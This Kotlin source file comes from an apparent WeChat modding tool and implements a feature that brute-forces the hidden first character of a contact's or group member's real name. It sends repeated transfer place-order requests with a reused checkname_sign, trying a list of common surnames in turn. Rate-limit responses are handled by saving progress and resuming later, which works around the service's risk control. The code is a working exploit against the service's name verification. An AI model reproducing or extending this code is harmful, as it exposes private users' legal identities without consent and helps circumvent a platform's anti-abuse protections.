package dev.ujhhgtg.wekit.features.items.chat

import android.app.Activity
import androidx.annotation.StringRes
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.text.KeyboardOptions
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.LinearWavyProgressIndicator
import androidx.compose.material3.Text
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.TextField
import androidx.compose.runtime.Composable
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.MutableIntState
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableIntStateOf
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.rememberCoroutineScope
import androidx.compose.runtime.setValue
import androidx.compose.ui.Modifier
import androidx.compose.ui.res.stringResource
import androidx.compose.ui.res.pluralStringResource
import androidx.compose.ui.text.input.KeyboardType
import dev.ujhhgtg.wekit.R
import dev.ujhhgtg.wekit.data.WeKitDatabase
import dev.ujhhgtg.wekit.data.entity.RealNameScanProgressEntity
import dev.ujhhgtg.wekit.data.JsonDataMigration
import dev.ujhhgtg.wekit.features.api.core.WeDatabaseApi
import dev.ujhhgtg.wekit.features.api.net.WeTransferApi
import dev.ujhhgtg.wekit.features.api.net.WeTransferApi.fetchBeforeTransfer
import dev.ujhhgtg.wekit.features.api.net.WeTransferApi.sendPlaceOrder
import dev.ujhhgtg.wekit.features.api.ui.WeContactPrefsScreenApi
import dev.ujhhgtg.wekit.features.core.FeatureCategoryIds
import dev.ujhhgtg.wekit.features.core.SwitchFeature
import dev.ujhhgtg.wekit.ui.content.AlertDialogContent
import dev.ujhhgtg.wekit.ui.content.Button
import dev.ujhhgtg.wekit.ui.content.DefaultColumn
import dev.ujhhgtg.wekit.ui.content.TextButton
import dev.ujhhgtg.wekit.ui.utils.ShowComposeDialogScope
import dev.ujhhgtg.wekit.ui.utils.showComposeDialog
import dev.ujhhgtg.wekit.utils.WeLogger
import dev.ujhhgtg.wekit.utils.android.currentWxId
import dev.ujhhgtg.wekit.utils.strings.isGroupChatWxId
import kotlinx.coroutines.CancellationException
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.runBlocking
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.util.concurrent.ConcurrentHashMap
import kotlin.time.Duration.Companion.seconds

object BruteForceGroupMemberRealNamesFirstChar : SwitchFeature(),
    WeContactPrefsScreenApi.IContactInfoProvider {

    override val technicalId = "爆破群成员实名首字"
    override val nameRes = R.string.feature_brute_force_group_member_real_names_first_char_name
    override val categoryIds = listOf(FeatureCategoryIds.CHAT, FeatureCategoryIds.CONTACT_DETAILS)
    override val descriptionRes = R.string.feature_brute_force_group_member_real_names_first_char_description

    private const val TAG = "BruteForceGroupMemberRealNamesFirstChar"

    /** WeChat's retcode for "姓名验证不正确" — i.e. the guessed [Char] was wrong. */
    private const val RETCODE_WRONG_NAME = "268502266"

    // ── Result cache ──────────────────────────────────────────────────────────

    /**
     * wxId → confirmed real-name first char. Only hits are stored.
     * Exposed so [DisplayGroupMemberRealName] can read it for combined display.
     */
    val realNames = ConcurrentHashMap<String, String>()
    private val savedProgress = ConcurrentHashMap<String, Int>()

    private suspend fun saveProgress(memberId: String, resumeIndex: Int) = withContext(Dispatchers.IO) {
        WeKitDatabase.instance.simpleStructuredDao()
            .putScanProgress(RealNameScanProgressEntity(memberId, resumeIndex))
        savedProgress[memberId] = resumeIndex
    }

    private suspend fun clearProgress(memberId: String) = withContext(Dispatchers.IO) {
        WeKitDatabase.instance.simpleStructuredDao().removeScanProgress(memberId)
        savedProgress.remove(memberId)
    }

    // ── Lifecycle ─────────────────────────────────────────────────────────────

    override fun onEnable() {
        runBlocking(Dispatchers.IO) {
            JsonDataMigration.requireCompleted("chat", "real_names_first_char")
            JsonDataMigration.requireCompleted("chat", "real_names_first_char_progress")
            val dao = WeKitDatabase.instance.simpleStructuredDao()
            val names = dao.getRealNameParts("FIRST")
            val progress = dao.getScanProgress()
            realNames.clear()
            realNames.putAll(names.associate { it.wxId to it.value })
            savedProgress.clear()
            savedProgress.putAll(progress.associate { it.wxId to it.resumeIndex })
        }
        WeContactPrefsScreenApi.addProvider(this)
    }

    override fun onDisable() {
        WeContactPrefsScreenApi.removeProvider(this)
    }

    // ── Contact-detail entry ──────────────────────────────────────────────────

    override fun getContactInfoItem(activity: Activity): List<WeContactPrefsScreenApi.PreferenceItem> {
        val memberId = activity.currentWxId ?: return emptyList()
        if (memberId.isGroupChatWxId) return emptyList()

        return listOf(
            WeContactPrefsScreenApi.PreferenceItem(
                title = localizedChatString(R.string.chat_real_name_bruteforce_title),
                summary = realNames[memberId]?.let {
                    localizedChatString(R.string.chat_real_name_bruteforce_first_char, it)
                } ?: localizedChatString(R.string.chat_real_name_bruteforce_tap),
                position = 1,
                onClick = onClick@{ activity ->
                    val clickedMemberId = activity.currentWxId ?: return@onClick
                    // Non-null only when the profile was opened from inside a group chat.
                    // Null means a direct friend lookup — beforetransfer and transferplaceorder
                    // both handle this case with groupId omitted.
                    val groupId = activity.intent.getStringExtra("Contact_ChatRoomId")
                        ?.takeIf { it.isNotEmpty() }

                    showComposeDialog(activity) { ExploitDialog(clickedMemberId, groupId) }
                },
            )
        )
    }

    // ── Brute-force orchestration ─────────────────────────────────────────────

    private sealed interface RunResult {
        /** Found the first char (and, if the challenge only asked for it, the whole revealed name). */
        data class Found(val char: String, val displayName: String) : RunResult

        /** Server said no name check is required for this transfer — nothing to brute-force. */
        data object NoCheckNeeded : RunResult
        data class Failed(@StringRes val reasonRes: Int, val formatArgs: List<Any> = emptyList()) : RunResult

        /** User aborted mid-run; carries how far we got. */
        data class Aborted(val tried: Int) : RunResult

        /**
         * Rate-limit retcode received. Progress was saved to disk; the next attempt will
         * resume from [resumeIndex] in [COMMON_SURNAMES].
         */
        data class Paused(val tried: Int, val resumeIndex: Int) : RunResult
    }

    private class RunState(
        val tried: MutableIntState,
        val total: Int,
        /** Absolute start index into [COMMON_SURNAMES] for this run (0 for fresh, >0 for resume). */
        val startIndex: Int = 0,
        @Volatile var cancelled: Boolean = false
    )

    /**
     * Full pipeline: beforetransfer → probe placeorder (to get the checkname challenge) → try each
     * surname as `input_name`, reusing the challenge's `checkname_sign`, until one is accepted.
     *
     * The loop starts at [RunState.startIndex] so that a paused run can resume from where it left
     * off. On a confirmed rate-limit retcode (unexpected, not [RETCODE_WRONG_NAME]), progress is
     * saved and [RunResult.Paused] is returned so the user can restart cleanly later.
     */
    private suspend fun runBruteForce(
        memberId: String,
        groupId: String?,
        amountYuan: Double,
        state: RunState
    ): RunResult {
        val before = fetchBeforeTransfer(memberId, groupId)
            ?: return RunResult.Failed(R.string.chat_real_name_bruteforce_error_before_transfer)
        val maskedRealName = before.maskedRealName
            ?: return RunResult.Failed(R.string.chat_real_name_bruteforce_error_missing_suffix)
        val key = before.key
            ?: return RunResult.Failed(R.string.chat_real_name_bruteforce_error_missing_key)

        val contact = WeDatabaseApi.getFriend(memberId)
        val nickname = contact?.let { it.remarkName.ifEmpty { it.nickname } } ?: memberId

        val ctx = WeTransferApi.TransferContext(
            memberId = memberId,
            groupId = groupId,
            maskedRealName = maskedRealName,
            truenameExtend = key,
            nickname = nickname,
            amountYuan = amountYuan,
            placeorderReserves = System.currentTimeMillis().toString()
        )

        // Probe: no input_name / checkname_sign → server returns the namemessage challenge.
        val probe = sendPlaceOrder(ctx, inputName = null, checknameSign = null)
            ?: return RunResult.Failed(R.string.chat_real_name_bruteforce_error_probe_timeout)

        WeLogger.i(TAG, "probe response: $probe")

        val needCheckName = probe.optInt("need_checkname", 0)
        if (needCheckName != 1) {
            clearProgress(memberId)
            return RunResult.NoCheckNeeded
        }

        val nameMessage = probe.optJSONObject("namemessage")
            ?: return RunResult.Failed(R.string.chat_real_name_bruteforce_error_missing_name_message)
        val checknameSign = nameMessage.optString("checkname_sign")
        val displayName = nameMessage.optString("display_name")
        if (checknameSign.isNullOrEmpty()) {
            return RunResult.Failed(R.string.chat_real_name_bruteforce_error_missing_signature)
        }
        WeLogger.i(TAG, "challenge: display_name='$displayName', sign=$checknameSign (startIndex=${state.startIndex})")

        // Resume from saved index so rate-limited runs don't retry already-eliminated candidates
        for ((index, candidate) in COMMON_SURNAMES.withIndex().drop(state.startIndex)) {
            if (state.cancelled) {
                clearProgress(memberId)
                return RunResult.Aborted(index - state.startIndex)
            }

            val resp = sendPlaceOrder(ctx, inputName = candidate, checknameSign = checknameSign)
            state.tried.intValue = index - state.startIndex + 1

            if (resp == null) {
                WeLogger.w(TAG, "guess '$candidate' timed out, continuing")
                delay(2.seconds)
                continue
            }

            val retcode = resp.optString("retcode")
            WeLogger.d(TAG, "guess '$candidate' → retcode=$retcode")

            when {
                retcode == RETCODE_WRONG_NAME -> {
                    // Wrong first char — keep going (rate-limit friendly delay)
                    delay(2.seconds)
                }

                retcode.isNullOrEmpty() || retcode == "0" -> {
                    withContext(Dispatchers.IO) {
                        WeKitDatabase.instance.simpleStructuredDao()
                            .recordFirstNameAndClearProgress(memberId, candidate)
                        realNames[memberId] = candidate
                        savedProgress.remove(memberId)
                    }
                    return RunResult.Found(candidate, displayName)
                }

                else -> {
                    // Unexpected retcode: risk control kicked in. Save progress so the user
                    // can resume from this exact candidate after the cooldown period.
                    WeLogger.w(TAG, "rate-limit retcode=$retcode at index=$index ('$candidate'), saving progress")
                    saveProgress(memberId, index)
                    return RunResult.Paused(tried = index - state.startIndex + 1, resumeIndex = index)
                }
            }
        }

        clearProgress(memberId)
        return RunResult.Failed(
            R.string.chat_real_name_bruteforce_error_exhausted,
            listOf(COMMON_SURNAMES.size),
        )
    }

    // ── Dialog ────────────────────────────────────────────────────────────────

    private sealed interface Phase {
        data object Idle : Phase
        data class Running(val state: RunState) : Phase
        data class Done(val result: RunResult) : Phase
    }

    @Composable
    private fun ShowComposeDialogScope.ExploitDialog(
        memberId: String,
        groupId: String?
    ) {
        var phase by remember { mutableStateOf<Phase>(Phase.Idle) }
        var amountInput by remember { mutableStateOf("100000") }
        var restarting by remember { mutableStateOf(false) }
        var saveFailed by remember { mutableStateOf(false) }
        val scope = rememberCoroutineScope()

        // Read saved progress once at composition time; stable for the dialog lifetime
        val resumeIndex = remember { savedProgress[memberId] }
        val remaining = remember(resumeIndex) {
            if (resumeIndex != null) COMMON_SURNAMES.size - resumeIndex else COMMON_SURNAMES.size
        }

        LaunchedEffect(phase) {
            val current = phase
            if (current is Phase.Running) {
                dialog.setCancelable(false)
                val amount = amountInput.toDoubleOrNull()?.takeIf { it > 0 } ?: 100000.0
                val result = try {
                    withContext(Dispatchers.IO) {
                        runBruteForce(memberId, groupId, amount, current.state)
                    }
                } catch (e: CancellationException) {
                    throw e
                } catch (e: Exception) {
                    WeLogger.e(TAG, "real-name operation failed before its result could be committed", e)
                    RunResult.Failed(R.string.structured_storage_save_failed)
                }
                phase = Phase.Done(result)
                dialog.setCancelable(true)
            }
        }

        AlertDialogContent(
            title = {
                Text(
                    if (phase is Phase.Idle) {
                        stringResource(R.string.chat_real_name_bruteforce_warning)
                    } else {
                        stringResource(R.string.chat_real_name_bruteforce_title)
                    },
                )
            },
            text = {
                DefaultColumn(Modifier.verticalScroll(rememberScrollState())) {
                    if (restarting) {
                        LinearWavyProgressIndicator()
                        Text(stringResource(R.string.structured_storage_saving))
                    }
                    if (saveFailed) {
                        Text(stringResource(R.string.structured_storage_save_failed), color = MaterialTheme.colorScheme.error)
                    }
                    when (val current = phase) {
                        is Phase.Idle -> {
                            Text(stringResource(R.string.chat_real_name_bruteforce_warning_message))
                            if (resumeIndex != null) {
                                Text(
                                    stringResource(
                                        R.string.chat_real_name_bruteforce_resume_message,
                                        COMMON_SURNAMES.size - remaining,
                                        COMMON_SURNAMES.size,
                                        COMMON_SURNAMES[resumeIndex],
                                    ),
                                )
                            }
                            TextField(
                                value = amountInput,
                                enabled = !restarting,
                                onValueChange = { amountInput = it.filter { c -> c.isDigit() }.take(7) },
                                label = { Text(stringResource(R.string.chat_real_name_bruteforce_amount)) },
                                keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Number),
                                singleLine = true
                            )
                        }

                        is Phase.Running -> {
                            val tried by current.state.tried
                            val total = current.state.total
                            Text(stringResource(R.string.chat_real_name_bruteforce_running, tried, total))
                            LinearWavyProgressIndicator(progress = { if (total == 0) 0f else tried.toFloat() / total })
                        }

                        is Phase.Done -> when (val r = current.result) {
                            is RunResult.Found ->
                                Text(
                                    stringResource(
                                        R.string.chat_real_name_bruteforce_found,
                                        r.char,
                                        r.displayName,
                                    ),
                                )

                            RunResult.NoCheckNeeded ->
                                Text(stringResource(R.string.chat_real_name_bruteforce_no_check))

                            is RunResult.Failed ->
                                Text(
                                    stringResource(
                                        R.string.chat_real_name_bruteforce_failed,
                                        stringResource(r.reasonRes, *r.formatArgs.toTypedArray()),
                                    ),
                                )

                            is RunResult.Aborted ->
                                Text(pluralStringResource(R.plurals.chat_real_name_bruteforce_aborted, r.tried, r.tried))

                            is RunResult.Paused ->
                                Text(
                                    pluralStringResource(
                                        R.plurals.chat_real_name_bruteforce_paused,
                                        r.tried,
                                        r.tried,
                                        COMMON_SURNAMES[r.resumeIndex],
                                    ),
                                )
                        }
                    }
                }
            },
            confirmButton = {
                when (phase) {
                    is Phase.Idle -> {
                        if (resumeIndex != null) {
                            // Two buttons when there is saved progress: resume (primary) and restart
                            Button(enabled = !restarting, onClick = {
                                phase = Phase.Running(
                                    RunState(mutableIntStateOf(0), remaining, startIndex = resumeIndex)
                                )
                            }) {
                                Text(
                                    stringResource(
                                        R.string.chat_real_name_bruteforce_continue_progress,
                                        COMMON_SURNAMES.size - remaining + 1,
                                        COMMON_SURNAMES.size,
                                    ),
                                )
                            }
                        } else {
                            Button(enabled = !restarting, onClick = {
                                phase = Phase.Running(
                                    RunState(mutableIntStateOf(0), COMMON_SURNAMES.size)
                                )
                            }) { Text(stringResource(R.string.chat_real_name_bruteforce_start)) }
                        }
                    }

                    is Phase.Done -> Button(onDismiss) { Text(stringResource(R.string.dialog_close)) }
                    else -> {}
                }
            },
            dismissButton = {
                when (val current = phase) {
                    is Phase.Idle -> {
                        if (resumeIndex != null) {
                            // "重新开始" clears saved progress and runs from index 0
                            TextButton(enabled = !restarting, onClick = {
                                restarting = true
                                saveFailed = false
                                dialog.setCancelable(false)
                                scope.launch {
                                    try {
                                        clearProgress(memberId)
                                        phase = Phase.Running(
                                            RunState(mutableIntStateOf(0), COMMON_SURNAMES.size)
                                        )
                                    } catch (e: CancellationException) {
                                        throw e
                                    } catch (e: Exception) {
                                        WeLogger.e(TAG, "failed to clear real-name scan progress", e)
                                        saveFailed = true
                                        dialog.setCancelable(true)
                                    } finally {
                                        restarting = false
                                    }
                                }
                            }) { Text(stringResource(R.string.chat_real_name_bruteforce_restart)) }
                        } else {
                            TextButton(onDismiss) { Text(stringResource(R.string.dialog_cancel)) }
                        }
                    }

                    is Phase.Running -> TextButton(onClick = { current.state.cancelled = true }) {
                        Text(stringResource(R.string.chat_real_name_bruteforce_abort))
                    }
                    is Phase.Done -> {}
                }
            }
        )
    }
}
